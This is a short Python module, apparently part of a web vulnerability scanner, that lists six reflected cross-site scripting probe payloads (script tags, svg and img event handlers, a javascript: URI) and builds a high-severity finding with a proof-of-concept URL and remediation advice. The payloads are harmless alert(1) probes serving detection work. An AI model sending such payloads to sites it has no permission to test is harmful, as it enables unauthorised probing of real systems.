"""XSS payload list + finding construction helper."""
from __future__ import annotations
from urllib.parse import quote
from webprobe.findings import Finding

PAYLOADS = [
    "<script>alert(1)</script>",
    '"><svg/onload=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'\"><script>alert(1)</script>",
]
DEGRADATION_THRESHOLD = 3
DEGRADED_MSG = ("[!] Target appears degraded — 3 consecutive failures.\n"
                "    Completing remaining modules with reduced confidence.")
REM = "Encode user-supplied output (e.g., htmlspecialchars / framework auto-escape)."


def mk_finding(url: str, param: str, payload: str) -> Finding:
    poc = f"{url}?{param}={quote(payload)}"
    return Finding(
        severity="HIGH", category="xss", name="Reflected XSS",
        url=url, parameter=param, payload=payload,
        evidence="payload reflected unescaped in response body",
        poc_url=poc, remediation=REM, fit3048_category=5,
    )
